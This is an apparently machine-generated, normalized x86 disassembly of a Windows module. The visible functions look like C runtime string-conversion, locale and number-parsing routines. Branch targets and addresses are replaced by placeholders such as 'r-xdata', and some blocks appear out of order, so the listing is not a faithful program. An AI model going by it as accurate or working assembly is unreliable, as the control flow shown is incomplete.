mov edi [ ebp - 0x7c ]
mov eax [ ebp - 0x68 ]
push eax
call sub_100173b1
add esp 0x4
mov edx [ esi ]
mov eax [ edx ]
push 0x1
mov ecx esi
call eax
dec eax
mov [ edi + 0x4 ] eax
mov esi [ ebx + 0x4 ]
neg esi
sbb esi esi
lea ecx [ ebp - 0x90 ]
not esi
call sub_100163e1
and esi ebx
je r-xdata
cmp eax 0xffffffff
jae r-xdata
mov eax [ esi ]
mov edx [ eax ]
push 0x1
mov ecx esi
call edx
dec eax
mov [ ebx + 0x4 ] eax
sub_10015b10
push ebp
mov ebp esp
push 0xffffffff
push sub_10028bc2
mov eax [ fs : 0x0 ]
push eax
sub esp 0x24
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov esi [ ebp + 0x8 ]
mov eax [ esi ]
mov ecx [ eax + 0x4 ]
mov ecx [ ecx + esi + 0x38 ]
xor edi edi
mov [ ebp - 0x18 ] edi
mov [ ebp - 0x2c ] esi
cmp ecx edi
je r-xdata
mov [ ebp - 0x4 ] edi
mov ecx [ esi ]
mov eax [ ecx + 0x4 ]
cmp [ eax + esi + 0xc ] edi
jne r-xdata
mov edx [ ecx ]
mov eax [ edx + 0x4 ]
call eax
mov eax [ esi ]
mov ecx [ eax + 0x4 ]
cmp [ ecx + esi + 0xc ] edi
sete cl
mov [ ebp - 0x28 ] cl
mov [ ebp - 0x4 ] 0x1
test cl cl
je r-xdata
mov eax [ eax + esi + 0x3c ]
cmp eax edi
je r-xdata
mov edx [ esi ]
mov ecx [ edx + 0x4 ]
add ecx esi
test edi edi
je r-xdata
mov eax [ eax + 0x4 ]
add eax esi
lea edi [ ebp - 0x1c ]
call sub_100034b0
mov edi eax
mov [ ebp - 0x4 ] 0x2
call sub_10007ca0
mov [ ebp - 0x4 ] 0x1
mov ebx [ ebp - 0x1c ]
mov [ ebp - 0x14 ] eax
test ebx ebx
je r-xdata
mov ecx eax
call sub_10003920
mov [ ebp - 0x4 ] 0x5
call j_sub_1001a4cd
test al al
jne r-xdata
mov eax [ ecx + 0xc ]
or eax edi
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
mov ebx [ ebp + 0xc ]
mov edi [ ebp - 0x14 ]
mov [ ebp - 0x4 ] 0x3
mov ecx [ esi ]
mov eax [ ecx + 0x4 ]
mov ecx [ ecx + 0x4 ]
mov edx [ ecx + esi + 0x38 ]
mov edi [ edi ]
mov [ ebp - 0x24 ] 0x0
movzx ecx [ ecx + esi + 0x40 ]
push ebx
push ecx
mov ecx [ ebp - 0x14 ]
add eax esi
push eax
push edx
mov edx [ ebp - 0x24 ]
push edx
mov edx [ edi + 0x1c ]
lea eax [ ebp - 0x24 ]
push eax
call edx
cmp [ ebp - 0x24 ] 0x0
mov edi 0x4
jne r-xdata
push 0x0
lea ecx [ ebp - 0x20 ]
call sub_100163b9
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ esi ]
mov ecx [ eax + 0x4 ]
mov ecx [ ecx + esi + 0x38 ]
test ecx ecx
je r-xdata
mov ecx esi
call sub_100064f0
push 0x0
call sub_100033b0
or eax 0x4
mov [ ebp - 0x4 ] 0x1
jmp r-xdata
mov edi [ ebp - 0x18 ]
mov edi [ ebx + 0x4 ]
neg edi
sbb edi edi
lea ecx [ ebp - 0x20 ]
not edi
call sub_100163e1
and edi ebx
je r-xdata
cmp eax 0xffffffff
jae r-xdata
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov edx [ ecx ]
mov eax [ edx + 0x8 ]
call eax
mov edx [ edi ]
mov eax [ edx ]
push 0x1
mov ecx edi
call eax
dec eax
mov [ ebx + 0x4 ] eax
sub_10015c42
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov ecx [ ecx + 0x4 ]
add ecx eax
mov eax [ ecx + 0xc ]
or eax 0x4
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
push 0x1
call sub_100033b0
mov [ ebp - 0x4 ] 0x1
mov eax r-xdata
retn
or eax 0x4
sub_10015cff
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
mov eax [ ebp + 0x8 ]
mov [ ebp + 0x8 ] eax
lea eax [ ebp + 0x8 ]
push eax
lea ecx [ ebp - 0xc ]
call sub_10016f5a
push r--data
lea eax [ ebp - 0xc ]
push eax
mov [ ebp - 0xc ] r--data
call sub_10017df7
int3
sub_10015d4c
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
mov eax [ ebp + 0x8 ]
mov [ ebp + 0x8 ] eax
lea eax [ ebp + 0x8 ]
push eax
lea ecx [ ebp - 0xc ]
call sub_10016f5a
push r--data
lea eax [ ebp - 0xc ]
push eax
mov [ ebp - 0xc ] r--data
call sub_10017df7
int3
sub_10015d99
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_10016fb6
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_100173b1
pop ecx
sub_10015dc5
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x14 ]
push esi
push edi
test eax eax
jne r-xdata
mov esi [ eax ]
mov edi [ eax + 0x4 ]
call sub_100182e0
mov esi [ eax + 0x8 ]
call sub_100182ba
mov edi eax
jmp r-xdata
and [ ebp + 0x14 ] 0x0
push edi
call sub_1001654b
pop ecx
lea ecx [ ebp + 0x14 ]
push ecx
push 0x0
push eax
call sub_1001829e
pop ecx
push eax
push [ ebp + 0x8 ]
lea eax [ ebp + 0xc ]
push 0x1
push eax
push 0x0
push edi
call [ WideCharToMultiByte@IAT ]
test eax eax
je r-xdata
mov ax [ ebp + 0xc ]
mov ecx 0xff
cmp ax cx
ja r-xdata
test esi esi
jne r-xdata
call sub_10017e85
mov [ eax ] 0x2a
or eax 0xffffffff
cmp [ ebp + 0x14 ] 0x0
je r-xdata
mov ecx [ ebp + 0x8 ]
mov [ ecx ] al
xor eax eax
inc eax
jmp r-xdata
pop edi
pop esi
pop ebp
retn
sub_10015e62
mov edi edi
push ebp
mov ebp esp
test [ ebp + 0x8 ] 0x1
push esi
mov esi ecx
mov [ esi ] r--data
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_100173b1
pop ecx
sub_10015e84
mov edi edi
push ebp
mov ebp esp
mov edx [ ecx + 0x4 ]
mov eax [ ebp + 0x8 ]
cmp edx [ eax + 0x4 ]
jne r-xdata
xor eax eax
mov ecx [ ecx ]
cmp ecx [ eax ]
jne r-xdata
xor eax eax
inc eax
jmp r-xdata
pop ebp
retn 0x4
sub_10015ea5
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push [ ebp + 0xc ]
mov eax [ ecx ]
push [ ebp + 0x8 ]
lea edx [ ebp - 0x8 ]
push edx
call [ eax + 0xc ]
mov ecx eax
call sub_10015e84
leave
retn 0x8
sub_10015ec6
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp ecx [ eax + 0x4 ]
jne r-xdata
xor eax eax
mov eax [ eax ]
cmp eax [ ebp + 0xc ]
jne r-xdata
xor eax eax
inc eax
jmp r-xdata
pop ebp
retn 0x8
sub_10015f07
mov edi edi
push ebp
mov ebp esp
push ecx
push [ ebp + 0xc ]
and [ ebp - 0x4 ] 0x0
call sub_10018baa
pop ecx
mov ecx [ ebp + 0x8 ]
push eax
call sub_10005650
mov eax [ ebp + 0x8 ]
leave
retn 0x8
sub_10015f2a
mov edi edi
push ebp
mov ebp esp
push ecx
and [ ebp - 0x4 ] 0x0
cmp [ ebp + 0xc ] 0x1
jne r-xdata
push [ ebp + 0xc ]
call sub_10018baa
pop ecx
push eax
push r--data
jmp r-xdata
mov ecx [ ebp + 0x8 ]
call sub_10005650
mov eax [ ebp + 0x8 ]
leave
retn 0x8
sub_10015f5a
mov edi edi
push ebp
mov ebp esp
push esi
push edi
mov edi ecx
mov esi [ edi + 0x2c ]
jmp r-xdata
test esi esi
jne r-xdata
push [ esi + 0x4 ]
push edi
push [ ebp + 0x8 ]
call [ esi + 0x8 ]
mov esi [ esi ]
add esp 0xc
pop edi
pop esi
pop ebp
retn 0x4
sub_10015f81
mov edi edi
push esi
push edi
push 0x0
mov esi ecx
call sub_10015f5a
mov eax [ esi + 0x28 ]
test eax eax
je r-xdata
mov eax [ esi + 0x2c ]
and [ esi + 0x28 ] 0x0
test eax eax
je r-xdata
mov edi [ eax ]
push eax
call sub_100173b1
pop ecx
mov eax edi
test edi edi
jne r-xdata
and [ esi + 0x2c ] 0x0
pop edi
pop esi
retn
mov edi [ eax ]
push eax
call sub_100173b1
pop ecx
mov eax edi
test edi edi
jne r-xdata
sub_10015fc5
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
cmp [ esi + 0x8 ] 0x0
jbe r-xdata
mov ecx esi
call sub_10015f81
mov esi [ esi + 0x30 ]
test esi esi
je r-xdata
mov eax [ esi + 0x8 ]
lea eax [ eax + rw-data ]
dec [ eax ]
cmp [ eax ] 0x0
jg r-xdata
pop esi
pop ebp
retn
mov ecx esi
call sub_10002ec0
push esi
call sub_100173b1
pop ecx
sub_10016018
mov edi edi
push ebp
mov ebp esp
push 0x8
call sub_1001740d
pop ecx
test eax eax
je r-xdata
xor eax eax
mov ecx [ rw-data ]
mov [ eax ] ecx
mov ecx [ ebp + 0x8 ]
mov [ eax + 0x4 ] ecx
jmp r-xdata
mov [ rw-data ] eax
pop ebp
retn
sub_10016042
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
test ecx ecx
je r-xdata
pop ebp
retn
call sub_10002e70
test eax eax
je r-xdata
mov edx [ eax ]
push 0x1
mov ecx eax
call [ edx ]
sub_10016063
mov edi edi
push ebp
mov ebp esp
push ecx
push 0x0
lea ecx [ ebp - 0x4 ]
call sub_100163b9
push rw-data
call sub_10016042
and [ rw-data ] 0x0
pop ecx
lea ecx [ ebp - 0x4 ]
call sub_100163e1
leave
retn
sub_10016095
mov edi edi
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
push sub_10016063
mov [ rw-data ] 0x1
call sub_10016e26
pop ecx
sub_100160bf
push 0x4
mov eax sub_10028408
call sub_10018b05
push 0x0
lea ecx [ ebp - 0x10 ]
call sub_100163b9
mov edi [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
mov esi [ edi + 0xc ]
jmp r-xdata
test esi esi
jne r-xdata
mov eax [ edi + 0x8 ]
dec esi
lea eax [ eax + esi * 4 ]
cmp [ eax ] 0x0
je r-xdata
push [ edi + 0x8 ]
call sub_1001750d
or [ ebp - 0x4 ] 0xffffffff
pop ecx
lea ecx [ ebp - 0x10 ]
call sub_100163e1
call sub_10018b6e
retn
mov ecx [ eax ]
call sub_10002e70
test eax eax
je r-xdata
mov edx [ eax ]
push 0x1
mov ecx eax
call [ edx ]
sub_1001611f
push 0x4
mov eax sub_10028408
call sub_10018b05
push 0x0
lea ecx [ ebp - 0x10 ]
call sub_100163b9
and [ ebp - 0x4 ] 0x0
jmp r-xdata
mov eax [ rw-data ]
test eax eax
jne r-xdata
mov esi eax
mov eax [ eax ]
mov ecx esi
mov [ rw-data ] eax
call sub_10016003
push esi
call sub_100173b1
pop ecx
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x10 ]
call sub_100163e1
call sub_10018b6e
retn
sub_1001616d
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
test eax eax
je r-xdata
pop ebp
retn
push eax
push 0x0
call sub_100199d5
pop ecx
pop ecx
sub_10016188
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
mov eax [ esi ]
push edi
mov edi [ ebp + 0x8 ]
cmp eax edi
je r-xdata
pop edi
mov eax esi
pop esi
pop ebp
retn 0x4
test eax eax
je r-xdata
and [ esi ] 0x0
test edi edi
je r-xdata
push eax
call sub_1001750d
pop ecx
cmp [ edi ] 0x0
mov eax edi
je r-xdata
sub eax edi
push ebx
lea ebx [ eax + 0x1 ]
push ebx
call sub_10019b49
pop ecx
mov [ esi ] eax
test eax eax
je r-xdata
inc eax
cmp [ eax ] 0x0
jne r-xdata
pop ebx
push ebx
push edi
push eax
call sub_100183c0
add esp 0xc
sub_100161e0
mov edi edi
push ebp
mov ebp esp
push 0x0
push 0x0
call sub_100199d5
pop ecx
pop ecx
test eax eax
jne r-xdata
push esi
mov esi [ ebp + 0x8 ]
push eax
lea ecx [ esi + 0x14 ]
call sub_10016188
cmp [ ebp + 0xc ] 0x0
je r-xdata
mov eax r--data
mov eax r--data
push [ ebp + 0xc ]
push 0x0
call sub_100199d5
pop ecx
pop ecx
test eax eax
jne r-xdata
push eax
lea ecx [ esi + 0x1c ]
call sub_10016188
pop esi
pop ebp
retn
sub_1001622d
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
mov cl [ ebp + 0x8 ]
xor eax eax
mov [ esi + 0x14 ] cl
lea ecx [ esi + 0x18 ]
mov [ esi + 0x4 ] 0x1
mov [ esi ] r--data
mov [ esi + 0x8 ] eax
mov [ esi + 0xc ] eax
mov [ esi + 0x10 ] eax
push r--data
mov [ ecx ] eax
mov [ ecx + 0x4 ] al
call sub_10016188
mov eax esi
pop esi
pop ebp
retn 0x4
sub_1001626c
push 0x4
mov eax sub_10028436
call sub_10018b05
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
push esi
mov [ ebp - 0x4 ] 0x1
call sub_100160bf
mov eax [ esi + 0x18 ]
pop ecx
test eax eax
je r-xdata
and [ esi + 0x18 ] 0x0
mov [ esi ] r--data
call sub_10018b6e
retn
push eax
call sub_1001750d
pop ecx
sub_100162af
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_1001626c
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_100173b1
pop ecx
sub_100162d0
push 0x4
mov eax sub_10028408
call sub_10018b05
mov eax [ rw-data ]
xor esi esi
mov edi eax
cmp eax esi
jne r-xdata
mov eax edi
call sub_10018b6e
retn
push esi
lea ecx [ ebp - 0x10 ]
call sub_100163b9
mov eax [ rw-data ]
mov [ ebp - 0x4 ] esi
mov edi eax
cmp eax esi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x10 ]
call sub_100163e1
push 0x20
call sub_1001740d
pop ecx
cmp eax esi
je r-xdata
push esi
mov edi esi
call sub_10016095
lea ecx [ esi + 0x18 ]
mov [ esi + 0x10 ] 0x3f
mov [ esp ] r--data
call sub_10016188
mov ecx esi
mov [ rw-data ] esi
call sub_10002e40
mov eax [ rw-data ]
mov [ rw-data ] eax
push esi
mov ecx eax
call sub_1001622d
mov esi eax
sub_1001635f
mov edi edi
push edi
push rw-data
mov edi ecx
call [ InterlockedIncrement@IAT ]
test eax eax
jne r-xdata
mov eax edi
pop edi
retn
push esi
mov esi rw-data
push esi
call sub_10016e83
add esi 0x18
pop ecx
cmp esi rw-data
jl r-xdata
pop esi
sub_10016390
push rw-data
call [ InterlockedDecrement@IAT ]
test eax eax
jns r-xdata
retn
push esi
mov esi rw-data
push esi
call sub_10016e93
add esi 0x18
pop ecx
cmp esi rw-data
jl r-xdata
pop esi
sub_100163b9
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
mov esi ecx
mov [ esi ] eax
cmp eax 0x4
jge r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
imul eax eax 0x18
add eax rw-data
push eax
call sub_10016ea3
pop ecx
sub_100163f8
mov edi edi
push esi
push 0x18
mov esi ecx
call sub_1001740d
push eax
mov [ esi ] eax
call sub_10016e83
pop ecx
pop ecx
mov eax esi
pop esi
retn
sub_1001643b
mov edi edi
push ebp
mov ebp esp
push ecx
mov cx [ ebp + 0x8 ]
movzx eax cx
mov edx 0xffff
mov [ ebp - 0x4 ] eax
cmp cx dx
je r-xdata
leave
retn
mov edx [ ebp + 0xc ]
push esi
mov esi [ edx ]
mov edx 0x100
test esi esi
jne r-xdata
push 0x1
lea eax [ ebp - 0x4 ]
push eax
push 0x1
lea eax [ ebp + 0x8 ]
push eax
push edx
push esi
call sub_10019bdd
add esp 0x18
test eax eax
movzx eax [ ebp + 0x8 ]
je r-xdata
push edi
pop edi
cmp cx dx
jae r-xdata
pop esi
mov eax [ ebp - 0x4 ]
lea edx [ ecx - 0x41 ]
cmp dx 0x19
ja r-xdata
add cx 0x20
movzx eax cx
jmp r-xdata
sub_100164a1
mov edi edi
push ebp
mov ebp esp
push ecx
mov cx [ ebp + 0x8 ]
movzx eax cx
mov edx 0xffff
mov [ ebp - 0x4 ] eax
cmp cx dx
je r-xdata
leave
retn
mov edx [ ebp + 0xc ]
mov edx [ edx ]
test edx edx
jne r-xdata
push 0x1
lea eax [ ebp - 0x4 ]
push eax
push 0x1
lea eax [ ebp + 0x8 ]
push eax
push 0x200
push edx
call sub_10019bdd
add esp 0x18
test eax eax
movzx eax [ ebp + 0x8 ]
je r-xdata
push esi
mov esi 0x100
cmp cx si
pop esi
jae r-xdata
mov eax [ ebp - 0x4 ]
lea edx [ ecx - 0x61 ]
cmp dx 0x19
ja r-xdata
sub cx 0x20
movzx eax cx
leave
retn
sub_10016509
mov edi edi
push ebp
mov ebp esp
sub esp 0x24
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push 0xa
push 0x1f
lea eax [ ebp - 0x23 ]
push eax
push 0x0
push [ ebp + 0x8 ]
mov [ ebp - 0x24 ] 0x2e
call sub_10019ddc
lea eax [ ebp - 0x24 ]
push eax
push 0x0
call sub_100198e0
mov ecx [ ebp - 0x4 ]
xor ecx ebp
add esp 0x1c
call sub_10016ec3
leave
retn
sub_1001654b
mov edi edi
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0x8 ]
push ebx
push esi
push edi
push 0x3e
xor edx edx
pop ecx
div ecx
xor esi esi
lea eax [ edx * 4 + rw-data ]
mov [ ebp - 0x4 ] eax
test esi esi
jne r-xdata
mov eax [ ebx + 0x4 ]
cmp eax [ ebp + 0x8 ]
je r-xdata
push edi
push esi
push [ ebp - 0x4 ]
mov [ esi ] edi
call [ InterlockedCompareExchange@IAT ]
cmp eax edi
jne r-xdata
push 0xc
call sub_10019dfb
mov esi eax
pop ecx
test esi esi
je r-xdata
test esi esi
je r-xdata
mov ebx [ ebx ]
test ebx ebx
jne r-xdata
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
mov ebx edi
test edi edi
je r-xdata
mov eax [ esi + 0x8 ]
xor eax eax
jmp r-xdata
mov ebx [ ebp + 0x8 ]
push ebx
call sub_10016509
pop ecx
mov [ esi + 0x8 ] eax
test eax eax
je r-xdata
mov eax [ ebx + 0x8 ]
jmp r-xdata
push [ esi + 0x8 ]
call sub_10018d74
push esi
call sub_1001750d
pop ecx
pop ecx
pop edi
pop esi
pop ebx
leave
retn
push esi
call sub_1001750d
pop ecx
mov [ esi + 0x4 ] ebx
sub_100165e8
push ebx
push esi
push edi
mov ebx rw-data
add ebx 0x4
cmp ebx rw-data
jl r-xdata
push [ esi + 0x8 ]
mov edi [ esi ]
call sub_10018d74
push esi
call sub_1001750d
pop ecx
pop ecx
mov esi edi
test edi edi
jne r-xdata
push 0x0
push ebx
call [ InterlockedExchange@IAT ]
mov esi eax
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
sub_10016639
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
test edi edi
je r-xdata
xor eax eax
cmp [ ebp + 0x10 ] 0x0
je r-xdata
cmp [ edi ] 0x0
jne r-xdata
mov eax [ ebp + 0x18 ]
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
mov esi [ eax ]
mov eax [ eax + 0x4 ]
call sub_100182e0
mov esi [ eax + 0x8 ]
call sub_100182ba
jmp r-xdata
xor ecx ecx
mov [ eax ] cx
push [ ebp + 0xc ]
call sub_1001654b
mov esi [ ebp + 0x14 ]
cmp [ esi ] 0x0
pop ecx
mov ebx eax
je r-xdata
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
mov [ ebp + 0xc ] eax
test esi esi
jne r-xdata
test ebx ebx
jne r-xdata
mov al [ edi ]
push ebx
mov [ esi + 0x1 ] al
call sub_1001829e
pop ecx
cmp eax 0x1
jle r-xdata
xor eax eax
inc eax
jmp r-xdata
movzx ecx [ edi ]
mov [ eax ] cx
movzx eax [ edi ]
mov ecx [ ebx + 0x4 ]
movzx eax [ ecx + eax + 0x1d ]
and eax 0x4
call sub_10019eda
movzx ecx [ edi ]
movzx eax [ eax + ecx * 2 ]
and eax 0x8000
jmp r-xdata
and [ esi ] 0x0
xor eax eax
cmp [ ebp + 0x8 ] eax
setne al
push eax
push [ ebp + 0x8 ]
push 0x2
push esi
push 0x9
push [ ebp + 0xc ]
call [ MultiByteToWideChar@IAT ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
xor eax eax
cmp [ ebp + 0x8 ] eax
setne al
push eax
push [ ebp + 0x8 ]
push 0x1
push edi
push 0x9
push [ ebp + 0xc ]
call [ MultiByteToWideChar@IAT ]
test eax eax
jne r-xdata
push ebx
call sub_1001829e
pop ecx
cmp [ ebp + 0x10 ] eax
jae r-xdata
test eax eax
je r-xdata
and [ esi ] 0x0
jmp r-xdata
push ebx
call sub_1001829e
pop ecx
cmp eax 0x1
jle r-xdata
mov al [ edi ]
push 0xfffffffe
mov [ esi ] al
pop eax
jmp r-xdata
call sub_10017e85
mov [ eax ] 0x2a
or eax 0xffffffff
jmp r-xdata
cmp [ edi + 0x1 ] 0x0
jne r-xdata
xor eax eax
cmp [ ebp + 0x8 ] eax
setne al
push eax
push [ ebp + 0x8 ]
push ebx
call sub_1001829e
pop ecx
push eax
push edi
push 0x9
push [ ebp + 0xc ]
call [ MultiByteToWideChar@IAT ]
test eax eax
jne r-xdata
push ebx
call sub_1001829e
pop ecx
jmp r-xdata
jmp r-xdata
sub_100167ac
mov edi edi
push ebp
mov ebp esp
push esi
call sub_100182e0
mov eax [ eax + 0x4 ]
mov esi [ ebp + 0x8 ]
mov [ esi ] eax
call sub_100182ba
push 0x2
push 0x100
mov [ esi + 0x4 ] eax
call sub_10019e40
pop ecx
pop ecx
mov [ esi + 0x8 ] eax
test eax eax
je r-xdata
call sub_10019eda
and [ esi + 0xc ] 0x0
mov [ esi + 0x8 ] eax
push 0x200
call sub_10019eda
push eax
push [ esi + 0x8 ]
call sub_100183c0
add esp 0xc
mov [ esi + 0xc ] 0x1
jmp r-xdata
mov eax esi
pop esi
pop ebp
retn
sub_1001680c
mov edi edi
push ebp
mov ebp esp
push ecx
lea eax [ ebp - 0x4 ]
push eax
push 0x1
lea eax [ ebp + 0x8 ]
push eax
push 0x1
call [ GetStringTypeW@IAT ]
movsx ecx [ ebp - 0x4 ]
neg eax
sbb eax eax
and eax ecx
leave
retn
sub_10016830
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
push [ ebp + 0x10 ]
sub eax [ ebp + 0x8 ]
sar eax 0x1
push eax
push [ ebp + 0x8 ]
push 0x1
call [ GetStringTypeW@IAT ]
mov eax [ ebp + 0xc ]
pop ebp
retn
sub_10016888
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
test edi edi
jne r-xdata
mov ebx [ ebp + 0x8 ]
movzx eax [ ebx ]
mov esi ebx
jmp r-xdata
lea edi [ ebp + 0x8 ]
push eax
call sub_1001a220
pop ecx
test eax eax
jne r-xdata
inc esi
movzx eax [ esi ]
mov al [ esi ]
cmp al 0x2d
je r-xdata
mov [ ebp + 0xf ] al
inc esi
cmp al 0x2b
je r-xdata
mov esi 0x7fffffff
cmp ebx [ edi ]
jne r-xdata
mov [ edi ] ebx
mov [ ebp + 0xf ] 0x2b
jmp r-xdata
cmp [ ebp + 0xf ] 0x2b
jne r-xdata
test eax eax
jne r-xdata
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push edi
push esi
call sub_10016c21
add esp 0x10
cmp esi [ edi ]
jne r-xdata
cmp [ ebp + 0xf ] 0x2d
jne r-xdata
cmp eax esi
ja r-xdata
call sub_10017e85
mov [ eax ] 0x22
mov eax [ ebp + 0x14 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
cmp eax 0x80000000
jbe r-xdata
xor eax eax
cmp [ ebp + 0xf ] 0x2d
sete al
add eax esi
jmp r-xdata
mov [ eax ] 0x1
neg eax
sub_1001692d
mov edi edi
push ebp
mov ebp esp
push ecx
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10016dbd
fstp [ ebp - 0x4 ]
fld [ ebp - 0x4 ]
add esp 0x10
leave
retn
sub_1001694f
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
test edi edi
jne r-xdata
mov ebx [ ebp + 0x8 ]
movzx eax [ ebx ]
mov esi ebx
jmp r-xdata
lea edi [ ebp + 0x8 ]
push eax
call sub_1001a220
pop ecx
test eax eax
jne r-xdata
inc esi
movzx eax [ esi ]
mov al [ esi ]
cmp al 0x2d
je r-xdata
mov [ ebp + 0xf ] al
inc esi
cmp al 0x2b
je r-xdata
mov esi 0x80000000
cmp ebx [ edi ]
jne r-xdata
mov [ edi ] ebx
mov [ ebp + 0xf ] 0x2b
jmp r-xdata
cmp [ ebp + 0xf ] 0x2b
jne r-xdata
mov ecx eax
or ecx edx
jne r-xdata
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push edi
push esi
call sub_10016a12
add esp 0x10
cmp esi [ edi ]
jne r-xdata
cmp [ ebp + 0xf ] 0x2d
jne r-xdata
cmp edx 0x7fffffff
ja r-xdata
call sub_10017e85
mov [ eax ] 0x22
mov eax [ ebp + 0x14 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
cmp edx esi
jb r-xdata
jb r-xdata
cmp [ ebp + 0xf ] 0x2d
jne r-xdata
mov [ eax ] 0x1
neg eax
adc edx 0x0
neg edx
ja r-xdata
cmp eax 0xffffffff
ja r-xdata
or eax 0xffffffff
mov edx 0x7fffffff
jmp r-xdata
xor eax eax
mov edx esi
jmp r-xdata
test eax eax
je r-xdata
sub_10016a12
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x14 ]
sub esp 0x28
push ebx
push esi
xor esi esi
push edi
cmp eax esi
je r-xdata
mov ebx [ ebp + 0x8 ]
movzx eax [ ebx ]
mov edi ebx
jmp r-xdata
mov [ eax ] esi
push eax
call sub_1001a220
pop ecx
test eax eax
jne r-xdata
inc edi
movzx eax [ edi ]
mov al [ edi ]
cmp al 0x2d
je r-xdata
mov [ ebp - 0x1 ] al
inc edi
cmp al 0x2b
je r-xdata
mov eax [ ebp + 0xc ]
cmp eax esi
cmp eax 0x1
je r-xdata
mov [ ebp - 0x1 ] 0x2b
jmp r-xdata
xor eax eax
xor edx edx
mov [ eax ] ebx
cmp eax 0x24
jg r-xdata
mov eax [ ebp + 0x10 ]
cmp eax esi
jl r-xdata
mov cl 0x30
cmp eax esi
jle r-xdata
cmp [ edi ] cl
je r-xdata
cmp eax 0x10
jne r-xdata
mov al [ edi + 0x1 ]
cmp al 0x78
je r-xdata
mov [ ebp + 0x10 ] 0xa
jmp r-xdata
mov [ ebp - 0xc ] edi
jmp r-xdata
cmp [ edi ] cl
jne r-xdata
mov [ ebp + 0x10 ] 0x10
cmp al 0x58
je r-xdata
cmp [ edi ] cl
je r-xdata
mov al [ edi + 0x1 ]
cmp al 0x78
je r-xdata
mov [ ebp + 0x10 ] 0x8
jmp r-xdata
inc edi
movsx eax [ edi ]
push [ ebp + 0x10 ]
mov [ ebp - 0x18 ] esi
push eax
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x10 ] edi
mov [ ebp - 0x20 ] esi
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x2 ] 0x0
call sub_1001b0c5
pop ecx
push eax
mov esi r--data
push esi
call sub_100175c0
mov ecx eax
add esp 0xc
test ecx ecx
je r-xdata
add edi 0x2
cmp al 0x58
jne r-xdata
cmp [ ebp - 0xc ] edi
jne r-xdata
mov eax [ ebp + 0x10 ]
cdq
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x24 ] edx
jmp r-xdata
mov ebx [ ebp + 0x10 ]
movsx ecx [ ebx + r--data ]
mov eax edi
sub eax ecx
sub eax [ ebp - 0x10 ]
js r-xdata
mov eax [ ebp + 0xc ]
test eax eax
jmp r-xdata
push [ ebp - 0x14 ]
mov eax [ ebp - 0x18 ]
push [ ebp - 0x18 ]
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x14 ]
push [ ebp - 0x24 ]
mov [ ebp - 0x1c ] eax
push [ ebp - 0x28 ]
mov bl cl
mov eax esi
sub bl al
mov [ ebp - 0x2 ] bl
call sub_1001b170
push [ ebp + 0x10 ]
mov ecx eax
movsx eax bl
mov [ ebp - 0x8 ] edx
cdq
add ecx eax
mov eax [ ebp - 0x8 ]
adc eax edx
mov [ ebp - 0x14 ] eax
inc edi
movsx eax [ edi ]
push eax
mov [ ebp - 0x18 ] ecx
call sub_1001b0c5
pop ecx
push eax
